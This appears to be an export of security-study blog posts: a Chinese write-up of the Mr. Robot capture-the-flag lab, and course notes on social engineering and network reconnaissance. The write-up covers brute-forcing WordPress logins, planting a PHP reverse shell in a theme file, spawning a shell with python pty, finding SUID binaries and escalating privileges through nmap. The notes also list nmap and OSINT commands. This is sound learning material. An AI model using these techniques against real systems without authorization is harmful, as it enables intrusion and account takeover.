接下来尝试提供的几个命令，发现都是未修改过的影片以及图片内容，感觉是来自某部电影或者电视剧，同时都没有拦截到与后台的交互，暂时感觉没有有价值的内容\n但join命令却要求输入邮箱，有用户输入感觉就可以操作，Burpsuite用intruder进行扫描，全都返回了统一的404，\n但同时返回了一个错误页面\n至此我已经没有什么其他想法了，其他的一些尝试包括访问https://www.whoismrrobot.com/ ，尝试阅读html源码以及目录下的一些js代码，也没有收获 拿到了里面的一些user:pwd，但也没没有什么作用，然后就搜到了同样题目的write-up，一开始打算看点提示，但浏览一下发现已经超出能力范围，只能拿来学习一下了\n根据write-up的复现 以下内容是根据找到的write-up的复现，同时带有一些思考 第一个key 首先使用目录扫描工具来对ip地址进行扫描，用到了diremap工具\npython3 dirmap.py -i 192.168.56.118 -lcf 发现一个熟悉的文件robots.txt，以前也遇到过在这个文件中包含信息的情况\n得到两个文件，分别打开\nUser-agent: * fsocity.dic key-1-of-3.txt 得到第一个key：key-1-of-3.txt, 以及一个字典文件fsocity.dic，此时判断可能是需要通过Burp进行爆破使用\n073403c8a58a1f80d943455fb30724b9 第二个key 利用字典进行爆破用户名，得到两个有用的用户名Elliot和elliot，似曾相识，之前在搜索 https://www.whoismrrobot.com/ 网站信息的时候有人提到过这个名字\n再次爆破密码，得到密码ER28-0652\n登陆wordpress\n接下来需要获取一个shell，浏览wordpress，找到可以放入webshell的地方，将kali自带的php-reverse-shell.php导入，然后用nc反弹shell，\n我这边将php-reverse-shell.php导入404.php中，update file之后访问，但是我首先得到的是network unreachable(101)的结果，kali也没有监听到来自8888端口的任何信息，同样测试主机的nc，也无效。这时候我才意识到靶机可能不允许向不同网段的地址发送我们想要的信息。\n因此接下来需要将靶机和kali设置到同一网段下，重新在vmware fusion中打开靶机，设置为桥接\n此时在kali上搜索自己的网段，得到了新的ip地址，172.16.249.10，之后重复上述操作\nkali打开nc进行监听，拿到shell\n输入whoami查看用户，发现是daemon不是root，接着查看靶机的密码 cat /etc/passwd\n尝试用密码登陆robot用户：su robot\n提示需要终端才能执行，利用python生成一个终端\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 使用密码进行登录后，查看文件，得到第二个key的值\n第三个key 接着进行提权 学习参考文章：https://www.anquanke.com/post/id/86979 利用一下命令，可以将从 / 目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。\nfind / -user root -perm -100 -print 2\u0026gt;/dev/null find / -perm -u=s -type f 2\u0026gt;/dev/null find / -user root -perm -100 -exec ls -ldb {} ; 搜索常见的具有提权功能的Linux可执行文件：\nNmap Vim find Bash More Less Nano cp 执行后发现nmap，确认权限中包含\u0026rsquo;s\u0026rsquo;，为root所有\n接下来利用旧版本的nmap提供交互模式可以得到一个具有相同权限也就是root权限的shell，进行提权后，再/root目录下面得到第三个key\n总结 发现了很多的不足，学到了很多思路和工具的使用，感觉之后还是应该多做题，先把重点放在了解前人的思路以及各种工具的使用上，而不是过度纠结一些题目： 文件目录扫描，dirbuster，dirmap,gobuster 有用的用户名会有不一样的返回，可以先扫用户名再扫密码 webshell与反弹shell，netcat的使用 生成终端 linux特定用户登录 md5解密 搜索具有root权限的可执行文件 利用nmap的交互模式进行提权 等等\n","date":"2022-03-13T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mr_robot/","title":"Mr. Robot writeup"},{"content":"SCT Topic 7: Social Engineering Strategies and Principles \u0026ldquo;The easiest way to get the information you want is always by asking the victims themselves:)\u0026rdquo;\nDefinition: Social engineering Social engineering is the practice of manipulating people into revealing confidential or sensitive information about the organisation, or to perform certain actions, such as: open an infected attachment via email click on a URL of a compromised website divulge information over the phone Instead of utilising the vulnerabilities we have seen previously, social engineering relies on non-technical strategies to exploit the weaknesses of human psychology.\nIt is very similar to some \u0026lsquo;marketing\u0026rsquo; purposes, which often involved \u0026lsquo;acting skills\u0026rsquo;, it requires social engineers to be confident with themsevles, and this sense of confidence will then naturally psychologically transfer also to the victim.\n\u0026ldquo;Pretending not be afraid is as good as actually not being afraid. \u0026mdash;-David Letterman\u0026rdquo;\nKey principles There are six key principles of influence that correspond to human behaviours heavily exploited by social engineering, identified by Professor Robert Cialdini, Regents\u0026rsquo; Professor Emeritus of Psychology and Marketing at Arizona State University, which originally from marketing\u0026rsquo;s purposes.\nPrinciple 1: Reciprocity People tend to return a favour. People usually do not trust free lunch, they would be more delight to take the benefit by doing a favour also to the attacker.\nPrinciple 2: Commitment and consistency People are willing to be honour to the ideas and goals they committed which fits their self-image, e.g., particular charity activities,recyling, vegetarianism. This a mental shortut we use to simplify our decision-making: we tend to simplify our decision making by using a post decision as reference for subsequent related choices. Consequently, we act in ways that are consistent with our intial action our thought, so that when we commit to something or someone, we stick to it.\nPrinciple 3: Social proof/consensus People are tend to follow the crowd. For example, if attackers can convince the victim that their colleagues, friends or family already done that, the victims will be more willing to click the malicious link.\nPrinciple 4: Autority/intimidation People tend to obey authority figures, even if they are asked to perform objectionable acts. The attacker can try to impersonate some senior members in their organisation or from government organisation, which the victim may not know personally.\nPrinciple 5: Liking/familarity People are more easily persuaded by people who seems to be familiar with themselves. The attackers could establish a link between them and victims by calling their first name, nickname, or throw some topics they may interesting (e.g., hobbies, sports).\nPirnciple 6: Scarcity/urgency Perceived scarcity will generate demand, and it may induce urgency in the victim. In this kind of scenario, victim could more easily to lose their judgement. Like a time-limited demand of work from the boss.\nAttack Phases Reconnaissance Phase Aims to Appear credible and lure the victims into revealing sensitive information or perform dangerous actions Goals Learn about roles or key figures in the organisation, and find organisation contact details and finally choosing victims. Passive and Active reconnaissances can explore the tactics to identify hosts, networks, and users of interst, see more details in previoius post about reconnaissance.\nVictim Approach Phase Goals?\nEstablish a confidential relationship/feeling between attackers and the victim, by\nExact victim\u0026rsquo;s positions in the company Use of nicknames known only in the company Praising the role of the victim (e.g., knowing what they do) Belonging to some mailing list Personal interests of the victim Who?\nUsually, Not senior members, but who closely tied to them (e.g., secretaries, collaborators)\nWhere?\nPhone, e-mail, social network (rarely done in person or face to face)\nHow?\nSpear phishing : Spear here is used to differentiating with traditional phishing, which is crafted for a specific victim. Send a targeted email to the vicitm, to lure them into clicking a link, opening an attachment, or revealing some sensitive information.\nVishing : Make a voice phone call to lure the victim into believing there is a demand for revealing sensitive information or performing attacker-desired actions. The attacker could impersonate a manager/senior member of the organisation, or pretending to be a colleague in need, which use the principle of \u0026ldquo;Principle 4: Authority/intimidation\u0026rdquo;.\nSmishing : The attacker choose the most trusted communication method, and sending a text message to victims.\nTailgating : Instead of getting information from the victim in previous stragies, tailgating is aim to enter a restricted areas, it can be realised by following people with access, or pretending to be someone with access, for instance, a courier.\nQuid Pro Quo : The attacker offers something in exchange for following his orders.\nFor example, the attacker may call the victims and pretend to be a technician, then convince the vicitm to follow commands to grant him access or which lead to malware installation. Occssionally, the attacker may already have pre-install malware which slows down the PC, then try to contact the victim to provide some help. Watering hole attacks https://www.ncsc.gov.uk/collection/supply-chain-security/watering-hole-attacks\nWatering hole attack is a social engineering attack, aims to exploit websites which frequently visit by target organisation for distribution of malware.\nPredator animals are used to wait those preys who will come to watering hole for water.\nfind a target organisation or group find their frequently visited/viewed websites find the weakness of these websites Inject scripts which could trigger driven-by download attack Victims visit the website and trigger the download attack Malware could be a Remote Access Trojan which can gain remote access to target\u0026rsquo;s system Countermeasures The core of social engineering is people, companies need to make regular security training for employees in all roles, to make them be aware of the potential strategies of attackers.\nSome strategies to check if you are being a victim of social engineering include:\nasking for the correct spelling of their name asking for a number where you can return the call asking them why they need this information asking them who has authorised the request and let them know that you will verify the authorisation. In general, if you suspect a social engineering attempt, report incidents immediately to the company’s security teams. Be skeptical and aware of risks.\nLook for emails with urgent requests of sensitive information or delicate actions, and typosquatting e-mail addresses.\n","date":"2022-03-07T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/social_engineering/","title":"SCT Topic 7: Social Engineering"},{"content":"SCT Topic 6: Network Reconnaissance and OSINT The initial phase of network security assessment is reconnaissance, in my understanding, this phase is used to gather the information of the target, including hosts, networks, users, services, etc.\nIt is an essential preparation mission before you can really do something to the target.\nAnd the reconnaissance could be separated to passive or active.\nPassive reconnaissance In this case, \u0026quot;passive\u0026quot; means you do not directly interact or engage with target system. More specifically, you do not send any type of request to the target, thus the targets have no way of acknowledgement what you are doing.\nYou should use all the tools to gather more information as possible (free, open source, commercial tools)\nQuerying Search Engines and Websites There are some typical data you can gather by querying search engines and websites Physical address of office locations Contact details, including email addresses and telephone numbers Details of internal email systems and routing DNS layout and naming conventions Files residing on publicly accessible servers Here are some powerful tools we can use:\nGoogle Advanced Search It is very common for us to complain that Google returns some irrelevant results, but actually Google provides some powerful tools to enhance the search, it is the \u0026ldquo;Goolge Advanced search\u0026rdquo;, we can use its syntax to refine our search rules.\nFor example, \u0026ldquo;inurl:program\u0026rdquo; results in all the websites or resources whose url or cotent contains the keyword \u0026ldquo;program\u0026rdquo;, you can even use \u0026ldquo;allinurl:program\u0026rdquo; to query all the url which contains \u0026ldquo;program\u0026rdquo;.\nAnother common example is, when you search \u0026ldquo;program moon\u0026rdquo;, the result will probabaly give you a lot of results with \u0026ldquo;program\u0026rdquo; while excluding the keyword \u0026ldquo;moon\u0026rdquo; because obviously there is less result contains moon.\nHowever, if you want to search the whole word which contains both \u0026ldquo;program moon\u0026rdquo;, you can surround the keywords with double quotes \u0026ldquo;\u0026ldquo;program moon\u0026rdquo;\u0026rdquo;, so powerful, isn\u0026rsquo;t it?\nQuerying Netcraft The Netcraft Web Application contains historical server fingerprints, which you can use to check the OS versions or map network blocks of a company\nThe link above shows the result of all recorded NIST government sites with their site, netblock, OS.\nShodan Shodan is a powerful search engine for gathering information on all devices connected to Internet. Use search query syntax(city, country, http.title net, org, port, etc.) to search for the devices information within the whole Internet. Some entries even may list corresponding known vulnerabilities.\nDifferences with Google?\nGoogle queries the resources on World Wide Web, but it is only a tiny fraction of Internet, Shodan\u0026rsquo;s goal is to provide a complete picture of the Internet. Shodan explicitly requires search query syntax. LinkedIn LinkedIn has a lot of personal profiles, it is always a good beginning for attacks like social engineering to dig deeper into an employee and an organisation. The LinkedIn Premium would help to look for people and roles without notifying them.\nDomain WHOIS WHOIS allows you to uncover the details information behind a domain. Typically, it contains:\nAdministrative contact details Mailing addresses for office locations Details of authoritative name servers for each domain Automated Email Enumeration The TheHarvester tool is used for gathering information of emails, sub-domains, hosts, employee names, open ports, and banners from different public sources like search engines, PGP key servers, and SHODAN computer database.\nexample 1 Search email addresses from domain kali.org with results of 200 and using Bing as data source.\ntheharvester -d kali.org -l 200 -b bing example 2\nSearch email addresses from domain nist.gov with results of 50 and using google as data source, finally saved the resources in myresults.html\nDNS Querying http://etutorials.org/Networking/network+security+assessment/Chapter+3.+Internet+Host+and+Network+Enumeration/3.3+DNS+Querying/\nWhat information we could retrieve from DNS Querying? Including: Authoritative DNS server information from name server (NS) records Domain and subdomain information Hostname information from A, PTR, and CNAME records Public points of presence that list mail exchanger (MX) records In some cases, poorly configured DNS servers also allow you to enumerate:\nOperating-system and platform information of hosts from the host information (HINFO) record Names and IP addresses of internal or nonpublic hosts and networks Why it is a passive recon? There is no active scanning or probing of the target networks, you just probe and query the information with authoritative DNS servers (for those domains or network blocks that are often run by ISPs). Meanwhile, most name servers are not aware of these potential sweeps, because they looks like normal DNS traffic.\nForward DNS Querying\nLegitimate forward query:\nAn end user accesses web site During the receipt of email when SMTP mail exchanger information is requested about the relevant domains Attacker: Issue forward DNS queries to identify mail servers and other obvious Internet-based systems\nTools:\nThe Sam Spade Windows client (available from http://www.samspade.org) The nslookup client found within most operating systems The host client found within Unix environments The dig client found within Unix environments DNS Zone transfer Techniques\nDNS zone : A DNS zone file contains all the naming information that the name server stores regarding a specific DNS domain, often including details of nonpublic internal networks and other userful information you can use to build an accurate map of the target infrastructure.\nWhy we need DNS Zone transfer? : In most organisations, they use multiple name server to implement load balancing and fault tolerance.\nThe main name server is known as the `primary name server` and all subsequent name servers are `secondary name servers`. Either a `primary` or `secondary` name server can be \u0026lt;span class=\u0026quot;underline\u0026quot;\u0026gt;queried for name resolution\u0026lt;/span\u0026gt;, thus, it is important that each name server have current (primary) DNS zone information. To ensure this, a `secondary name server` will \u0026lt;span class=\u0026quot;underline\u0026quot;\u0026gt;regularly\u0026lt;/span\u0026gt; requests a complete listing of the computers it is responsible for from the primary. Tools used to request DNS zone transfer information include:\nThe Sam Spade Windows client (available from http://www.samspade.org) The nslookup client found within most operating systems The host client found within Unix-based environments The dig client found within Unix-based environments Reverse DNS Sweeping\nYou may notice in previous techniques, they require domain name as parameter, but in this case, we do the opposite thing against name resolution, we called reverse DNS.\nIt can gather details of hosts that may be protected or filtered but still have DNS hostnames assigned to them. It is also able to identify hosts and potential weaknesses within Internet-based points of presence because it reveals hosts and networks that may not be revealed during DNS zone transfer queries.\nCountermeasures Disable directory indexing on Web servers Use “robots.txt” to prevent indexing of certain content by search engines but do NOT rely on it to protect sensitive data Use generic details in WHOIS data (or privacy-protect it) Disable DNS zone transfers to untrusted hosts Prune DNS zone files from unnecessary information Preventing TypoSquatting: you may check if a similar domain is available, if you are Nintendo you may check for alternative domains with small variants (that people may mistype by accident while trying to visit your website). Active reconnaissance Compare to the passive reconnaissance, ACTIVE means actively interact with target services, network and hosts.\nActive Reconnaissance Tools Nmap (\u0026ldquo;Network mapper\u0026rdquo;) is the most used tools to perform Internet network scans, is a free and open source utility for network discovery and security auditing.\nOther commonly used tools include:\nNessus Rapid7 Nexpose QualysGuard You always need to use both free and commercial tools to assess the network because the attackers will do the same!\nSome types of nmap scans\nTCP scanning with connection (-sT, the default), Connection scans TCP scanning with SYN packets (-sS) TCP scanning through FIN (finished, is used to initial to close the connection) packets (-sF), no log file on server TCP scanning empty (-sN) TCP scanning Xmas Tree (FIN + PUSH + URG, -sX) TCP scanning through ACK packets (-sA) TCP canning with Window Size (-sW) TCP scanning through R nmap 10.130.1.43 nmap -Sp The -sP option sends an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default. Host Scanning Aim To confirm if a target IP is reachable/active through Internet Automated execution of a series of ping commands to determine which systems are active\nKnown Techniques\nPing sweep\nICMP sweep\nNormally, the \u0026quot;ping\u0026quot; command is used to send ICMP ECHO_REQUEST packet to expect ICMP ECHO_REPLY\nHowever, it takes too much time in a large-scale networks because of waiting for the replay sequencly\nThus, we could use fping to sends \u0026ldquo;blocks of ping\u0026rdquo; at the same time to fix this problem\nDefense against ping and fping scans Block all ICMP traffic Counter-defense scan ports at the transfer layer (TCP/UDP), e.g., through nmap or hping3 to send TCP ACK, you can see an example in Idle scanning later. Port Scanning Aim Try to connect to TCP and UDP ports of the target system to determine which network services are active (or LISTENING). nmap -p(range) \u0026lt;target IP\u0026gt; namp -p3389,20-100 10.130.1.43 It is important to know the active ports which can by exploited to attack.\nUDP Portscan Send a zero-length UDP packet to each port to determine which UDP services are available, if an ICMP error message \u0026ldquo;port unreachable\u0026rdquo; is received, it assumed that this service is unavailable. nmap -sU 192.168.1.1 TCP Portscan Try to establish a TCP handshake to all the 65535 ports of the victim host to determine TCP services are available or not: Advantage: no need to be root\nDisadvantage: very noisy\nnmap -sT 192.168.1.1 TCP FIN Scan\nThe attacker sends a FIN-marked (to close TCP connection) packet to victim host\nIf the port is closed, a RST packet is sent back If the port is open, the FIN packet is ignored (timeout) nmap -sF 110.130.1.43 Idle Scanning\nhttps://www.icterra.com/what-is-idle-scan/\nHow to understand the word \u0026ldquo;idle\u0026rdquo;? : \u0026quot;Idle\u0026quot; is the requirement of the zombie computer, it requires the zombie computer have low network traffic (or better it has almost no traffic). Thus it usually happens overnight.\nSo why we need the zombie computers do not have any other traffic?\nThe reason is directly pointing to the mechanism of idle scanning: basically, idle scanning aims to use zombie computers to \u0026ldquo;relay\u0026rdquo; the scan without exposing attackers to victims, and get the status of service ports.\nBefore we elaborate the mechanisms of idle scanning, let\u0026rsquo;s briefly recap the knowledge about the response of SYN segments\nTCP SYN Scanning: AKA \u0026ldquo;half-open\u0026rdquo; scanning\nIf a SYN/ACK segment is sent to a host, it will respond with RST(reset) segment (because there is no corresponding session which started with a SYN earlier to SYN/ACK) If a SYN segment is sent to a host, it will respond with a RST(reset) if the port closed If a SYN segment is sent to a host, it will respond with a RST if the port closed,\nIf a SYN segment is sent to a host, it doesn\u0026rsquo;t give a response if the port filtered.\nNow let\u0026rsquo;s talk about the mechanism details with three scanning examples:\nIdle Scan (Victim Port Open)\nThe attacker sends a SYN/ACK segment to the Zombie computer\nZombie computer responses with RST segment with its IP ID is incremented by \u0026ldquo;one\u0026rdquo;\nSince attackers get the initial IP ID value of Zombie computer, they will then sends a spoofed SYN segment with Zombie computer\u0026rsquo;s IP address to the Victim\u0026rsquo;s computer\nThe Attacker pretend to be zombie computer, and communicate with the victim.\nSince the target port is open, the victim computer will response a SYN/ACK segment to Zombie computer.\nHowever, the zombie computer did not establish a session with Victim computer, so when it receive the SYN/ACK segment, it will respond with a RST segment to it, and meanwhile, increases its IP ID by \u0026ldquo;one\u0026rdquo; to 6,163\nThe attackers want to check the current IP ID, thus they send another SYN/ACK segment to The Zombie computer\nThe Zombie computer responds with a RST segment and increases its IP ID by \u0026ldquo;one\u0026rdquo; to 6,164 then sends to the attacker\nThe attackers check the IP ID is increased by \u0026ldquo;two\u0026rdquo; which could confirm that the victim computer is OPEN.\nBased on this, we can also get the reason why we require the victim computer to be \u0026ldquo;idle\u0026rdquo;, otherwise, the increment could be uncertain.\nIdle Scan (Victim Port Closed)\nSo, what if the port is closed? This time, the spoofed SYN segment will not get the response of RST, which avoid the Zombie computer to interact with Victim computer, and the IP ID did not increase, thus finally we will get the IP ID only increase by \u0026ldquo;one\u0026rdquo;, which indicate the port is closed.\nIdle Scan (Victim Port Fillterd)\nIf there is a firewall filter the spoofed SYN segment, the Victim computer will not send anything to Zombie computer, which result in the same IP ID as Port closed case.\nOS Fingerprinting Aim To determine the operating system of a host: Which OS? Which Version? sudo nmap -O localhost #+begin_src bash nmap -O -PN 192.168.1.1/24 k#+end_src\nService Enumeration/Banner Grabbing By grabbing the headers of exposed services, nmap (option -sV) can try to infer the exact service version\nNmap Scripting Engine Nmap provide a series of scripts for checking the vulnerabilities based on open services of victim host\nScripts can be found in usr/share/nmap/scripts\nnmap --secript [script name] [target] Mitnick-Shimomura attack IP spoofing attack\nWe assume A and B trust each other, they will establish connection without further authentication with each other.\nAnd C is the attacker who want to impersonate B with respect to A in opening a TCP connection\nC first kill B with flooding, crashing or redirecting, then B can\u0026rsquo;t send RST segments back to A C sends a spoofed TCP SYN segment with B\u0026rsquo;s IP address to A, and s_c as the sequence number A replies with a TCP SYN/ACK segment to B with s_s as the sequence number. But B can\u0026rsquo;t reply. C does not receive segment from A, but C wants to continue the connection, so C send an ACK segment with s_s + 1 as the acknowledgement number C need to guess the sequence number Countermeasure: Block scanning (e.g., ICMP) Check open ports and configuration, to make sure that only appropriate services are exposed. Monitor network activity (e.g., Intrusion Detection System, SIEM) ","date":"2022-02-28T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/network_security_assessment/","title":"SCT Topic 6: Network Reconnaissance and OSINT"}]